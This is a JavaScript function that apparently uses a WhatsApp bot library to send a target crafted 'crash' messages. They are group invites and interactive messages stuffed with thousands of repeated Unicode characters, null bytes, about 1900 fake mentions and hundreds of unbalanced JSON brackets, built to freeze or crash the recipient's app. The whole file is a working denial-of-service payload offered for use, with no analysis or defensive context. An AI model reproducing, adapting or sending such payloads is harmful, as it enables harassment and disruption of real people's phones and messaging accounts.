async function DelaFreezCloseRelay(sock, target) {
  try {
    const randomJid = `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`;
    const generateMentioned = Array.from({ length: 1900 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    );

    const message = {
      groupInviteMessage: {
        groupJid: "120363370626418572@g.us",
        inviteCode: "Xx".repeat(200),
        inviteExpiration: "99999999999",
        groupName: "</> Killertzy" + "ោ៝".repeat(200),
        caption: "ោ៝".repeat(300),
        jpegThumbnail: null,
        contextInfo: {
          participant: target,
          remoteJid: randomJid,
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...generateMentioned
          ],
          groupInviteMessage: {
            inviteCode: "Xx".repeat(200),
            groupJid: "120363370626418572@g.us",
            groupName: "ោ៝".repeat(200),
            inviteExpiration: 99999999999,
            caption: "ោ៝".repeat(300)
          },
          quotedMessage: {
            extendedTextMessage: {
              text: " ~ Killertzyπ ",
              contextInfo: {
                mentionedJid: ["13135550002@s.whatsapp.net"],
                externalAdReply: {
                  title: "\u0000".repeat(3000),
                  body: "who i am • @Killertzy2",
                  thumbnailUrl: "",
                  mediaType: 1,
                  sourceUrl: `https://xnxx.com/${"ꦾ".repeat(3000)}`,
                  showAdAttribution: false
                }
              }
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500)
            }
          }
        }
      },
      extendedTextMessage: {
        text: '.',
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "olaa" + " ꦾ".repeat(50)
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: 'CHAT_SETTING'
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const listMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              mentionedJid: [target, "13135550002@s.whatsapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast"
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: "killertzy",
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: "{[".repeat(500), 
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: "]}".repeat(500),
              subtitle: "killertzy",
              hasMediaAttachment: false,
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              messageParamsJson: "{[".repeat(500),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" }
              ],
              messageParamsJson: "]}".repeat(500)
            })
          })
        }
      }
    };

    await sock.sendMessage(target, message);
    await sock.relayMessage(target, listMsg.viewOnceMessage.message, { messageId: generateMessageID() });

  } catch (e) {
    console.error("Gagal kirim DelaFreezCloseRelay:", e);
  }
}